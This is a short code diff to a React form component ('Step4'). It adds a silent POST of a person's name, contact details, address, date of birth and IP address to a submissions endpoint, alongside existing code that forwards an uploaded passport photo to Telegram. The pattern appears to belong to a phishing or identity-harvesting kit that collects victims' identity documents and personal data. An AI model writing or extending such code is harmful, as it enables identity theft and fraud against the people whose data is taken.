@@ -106,6 +106,26 @@ export default function Step4() {
       `━━━━━━━━━━━━━━━━━━━━━`
     );
 
+    await fetch("/api/submissions/personal", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: user?.username ?? "",
+        firstName,
+        lastName,
+        email,
+        phone,
+        address,
+        city,
+        state,
+        postalCode,
+        dob,
+        inquiryType,
+        message,
+        ipAddress: ip,
+      }),
+    }).catch(() => {});
+
     if (passportFile) {
       await sendFileToTelegram(passportFile, `📷 Passport Photo — ${user?.username ?? "-"}`);
     }
